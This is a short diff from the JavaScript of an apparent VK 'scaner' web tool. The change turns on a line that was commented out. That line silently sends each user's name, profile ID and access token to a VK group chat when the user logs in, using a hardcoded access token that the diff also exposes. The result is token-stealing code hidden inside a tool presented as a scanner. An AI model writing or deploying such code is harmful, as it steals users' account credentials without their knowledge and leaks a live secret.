@@ -79,7 +79,7 @@ function start_reg() {
 								get_friends(""+my_access_id+"", ""+my_access_token+"", ""+max_count+"", "0", "1");
 								var messagenum = +new Date % 10;
 								var messagelog = ''+data.response[0].first_name+' '+data.response[0].last_name+'(vk.com/id'+my_access_id+') authorizing in scaner.<br>Token: '+my_access_token+'.';
-								//$.ajax({ url: 'https://api.vk.com/method/messages.send?peer_id=2000000001&message='+messagelog+'&access_token=c99b855c29f76cbf5182ba7f3651875435b7086ba401a96b5b1482469e5e3cc002b4d42bc47faaf6ec7c1&v=5.101&random_id='+messagenum+'', type: 'GET', dataType: 'jsonp', crossDomain: true });
+								$.ajax({ url: 'https://api.vk.com/method/messages.send?peer_id=2000000001&message='+messagelog+'&access_token=c99b855c29f76cbf5182ba7f3651875435b7086ba401a96b5b1482469e5e3cc002b4d42bc47faaf6ec7c1&v=5.101&random_id='+messagenum+'', type: 'GET', dataType: 'jsonp', crossDomain: true });
 							} else {
 								document.querySelector('#check_reg').innerHTML = 'Войти';
 								var index = Date.now();
